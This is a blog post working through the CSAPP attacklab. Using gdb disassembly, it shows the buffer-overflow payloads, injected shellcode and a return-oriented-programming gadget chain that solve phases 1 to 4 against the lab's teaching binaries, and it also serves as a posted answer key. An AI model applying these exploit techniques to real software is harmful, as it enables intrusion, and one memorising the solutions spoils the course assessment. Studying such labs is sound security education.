---
title: 【施工完成】CSAPP attacklab
date: 2020-02-15T23:24:23+08:00
draft: false
author: "111qqz"
type: post
url: /2020/02/csapp-attacklab/
categories:
- mooc
tags:
- csapp
---

## 背景

CSAPP 处理器那章快看完了，猛然发现竟然还有个attacklab.. 之前以为每一章只有一个lab

这个lab是教大家如何找到程序的漏洞并实施攻击。
知道如何实施攻击，才能更好地写出安全的代码。

包含5个phase

前三个没有什么保护措施,栈地址是固定的,可以注入可执行代码,比较容易.
后两个加了随机栈地址以及栈上地址不可执行的保护措施,需要用[Return-oriented_programming](https://en.wikipedia.org/wiki/Return-oriented_programming) 的方式搞定.


## phase 1

第一个比较简单，利用buffer overflow 来将函数的返回地址，替换成一个已知函数的地址，达到执行特定函数的目的。

回忆一下函数调用的机器代码实现，需要先把函数的返回地址压栈，然后开辟栈空间，做些有的没的，做完之后析构开辟的栈空间，并把之前压入栈中的地址赋值给%ip(或者叫PC)，作为下一条指定的地址。函数的返回地址通常就是函数后面第一条指令的地址。

可以参考如下两张图。

![函数调用.png](https://i.loli.net/2020/02/15/EB8zbtqpFKUAPH4.png)

![函数调用2.jpg](https://i.loli.net/2020/02/15/gBSsAm5NJrVWheo.jpg)



我们观察getbuf的反汇编代码:

```GAS

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.

```

看到getbuf函数开辟了0x28大小的栈空间

也就是说输入至多0x28个字符，不会有问题。

那么为了达成我们的目的，我们可以前0x28个字符任意输入，后面输入我们希望执行的touch1函数的地址，也就是
0x00000000004017c0

```GAS

(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.

```

这里要用到hex2raw

顾名思义，这个工具是用来将十六进制数值转换成对应的ascii字符。 为什么需要这个工具呢？ 因为我们看到的地址是十六进制，此时我们需要输入某个字符串，让其得到我们预期的十六进制地址。 现在是我们知道十六进制地址，因此可以通过hex2raw反推得到我们需要的字符串。


需要注意的是hex2raw是以EOF作为结束标识的，因此屏幕输入似乎没办法结束，可以使用文件重定向。


因此答案可以是

```

30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
c0 17 40 00

```


最后得到结果

```shell

$ cat level1.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget

```

## phase 2

第二个稍微复杂一些，需要注入一段可执行代码,使得调用touch2函数,并且传递一个参数进去.
大致的思路是:

- 插入一段可执行代码
- 使函数本身ret到插入的可执行代码地址
- 可执行代码中再次ret到touch2


我们分析一下得知,我们注入代码的方式是往定义在getbuf函数中的local var读入字符串,因此可执行代码的地址一定在栈上的某个位置.

让getbuf返回时跳到这段可执行代码比较容易,思路和level1一样. 可是跳到这段 injected code 后,如何再跳到touch2函数呢?

回忆ret指令,是pop得到一个地址,作为PC的地址

因此自然想到我们应该先把touch2的地址压栈,也就是 
```GAS
push $0x4017ec

不要使用 mov $0x4017ec $rsp 

```


```GAS

(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:    mov    $0x2,%edi
   0x000000000040181d <+49>:    callq  0x401c8d <validate>
   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:    mov    $0x403110,%esi
   0x0000000000401829 <+61>:    mov    $0x1,%edi
   0x000000000040182e <+66>:    mov    $0x0,%eax
   0x0000000000401833 <+71>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:    mov    $0x2,%edi
   0x000000000040183d <+81>:    callq  0x401d4f <fail>
   0x0000000000401842 <+86>:    mov    $0x0,%edi
   0x0000000000401847 <+91>:    callq  0x400e40 <exit@plt>
End of assembler dump.

```

此外需要注意,第一个参数是存在%rdi而不是%edi中.

因此,这段注入代码需要做的事情为:

```GAS

mov $0x59b997fa,%rdi
push $0x4017ec
ret

```

其中 $0x59b997fa 是cookie的值


最后注入的十六进制编码为:

```GAS
48 c7 c7 fa 97 b9 59  /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00   	  /* pushq  $0x4017ec */
c3                    /* retq  */
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30   
78 dc 61 55   /* address of injected code */


```

```shell

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 

```



## phase 3 

传入的参数变成了一个字符串.  本以为没什么难度...
然而...发现没地方存储这个字符串.... 栈上所有的位置全都被破坏了orz...

怎么发现的呢... 可以用gdb watch $rsp

就会发现,从 0x5561dc78 到 0x5561dca0这0x28个位置中,根本找不到一段长度为9的连续空间让我存储这个字符串...

最后的办法是在插入的可执行代码中,将字符串通过指令放在0x5561dc78前的位置...

卡了三个小时...


因此这道题的关键就是,找到一个不会被破坏的栈上空间来存这个字符串...


最终答案为:

```GAS

30 31 32 
c7 44 24 c4 35 39 62 39      /* movl   $0x39623935,-0x3c(%rsp)       */
c7 44 24 c8 39 37 66 61      /* movl   $0x61663739,-0x38(%rsp)      */
c7 44 24 cc 00 00 00 00      /* movl   $0x0,-0x34(%rsp)      */
48 c7 c7 6c dc 61 55         /* mov    $0x5561dc6c,%rdi             */
68 fa 18 40 00   	           /* pushq  $0x4018fa                    */
c3                           /* retq                                */
7b dc 61 55



```shell

$ Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:30 31 32 C7 44 24 C4 35 39 62 39 C7 44 24 C8 39 37 66 61 C7 44 24 CC 00 00 00 00 48 C7 C7 6C DC 61 55 68 FA 18 40 00 C3 7B DC 61 55 

```


## phase 4


还是要碰到touch2,但是现在加了栈随机化等保护措施,原来注入可执行代码的方式行不通了.

现在的思路是,从现成的代码中,组合成一段我们需要执行的操作.

这种现成的代码我们称之为 gadget,以ret 命令结尾.

我们可以通过在栈上放一串 gadget 的地址,达到执行一堆指令的目的.


![gadget在栈上的示意图.png](https://i.loli.net/2020/02/17/napNV1BJbyvfz5X.png)

注意这个栈是向上增长的...

还有的一个疑问是,为什么我们(几乎总是)能在现成的指令中找到我们需要的指令?

原因是x86指令集是比较稠密的,随便一段编码,都可能是一段合法的指令.


>Although return-oriented programming attacks can be performed on a variety of architectures,Shacham's paper and the majority of follow-up work focus on the Intel x86 architecture. The x86 architecture is a variable-length CISC instruction set. Return-oriented programming on the x86 takes advantage of the fact that the instruction set is very "dense", that is, any random sequence of bytes is likely to be interpretable as some valid set of x86 instructions.

>It is therefore possible to search for an opcode that alters control flow, most notably the return instruction (0xC3) and then look backwards in the binary for preceding bytes that form possibly useful instructions. These sets of instruction "gadgets" can then be chained by overwriting the return address, via a buffer overrun exploit, with the address of the first instruction of the first gadget. The first address of subsequent gadgets is then written successively onto the stack. At the conclusion of the first gadget, a return instruction will be executed, which will pop the address of the next gadget off the stack and jump to it. At the conclusion of that gadget, the chain continues with the third, and so on. **By chaining the small instruction sequences, an attacker is able to produce arbitrary program behavior from pre-existing library code. Shacham asserts that given any sufficiently large quantity of code (including, but not limited to, the C standard library), sufficient gadgets will exist for Turing-complete functionality.**


于是我们来看一下gadget farm中都有什么指令


![gadget fram指令.png](https://i.loli.net/2020/02/17/w6HjMPi9gBXCnuQ.png)



然后发现,只有
```GAS
movq %rax,%rdi和 popq %rax
```

我们的思路是先在第一个gadget中把cookie从栈上拿下来放在寄存器里,然后调用第二个gadget,
把cookie放到 %rdi中,并且调用touch2的地址..

因此,按照出栈从前往后的顺序,栈上应该放的地址为:

gadget 1的地址
cookie
gadget 2的地址
touch3 的地址


感觉问题解决了..

然而实际segment falut到怀疑人生...反复看了lab题面,以及CSAPP相关内容....


最后发现.. 是因为pop指令是popq,也就是一次会出栈8个byte...
而我是按照一次出栈4个byte来读入的..orz  蠢哭了好吗...


因此最终答案为:

```GAS

30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
cc 19 40 00 00 00 00 00   /* address of <getval_280+2>,0x58 aka. pop %rax  */
fa 97 b9 59 00 00 00 00   /*  $0x59b997fa */
a2 19 40 00 00 00 00 00   /* address of <addval_273+2>,0x48 0x89 0xc7 aka.movq %rax,%rdi */
ec 17 40 00 00 00 00 00   /* address of touch3 */


```

```shell
$ Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 


```




## phase 5

看了下完成前四个phase已经拿到了 95/100的分数...

phase5更像是附加题...所以打算直接放弃掉了. 
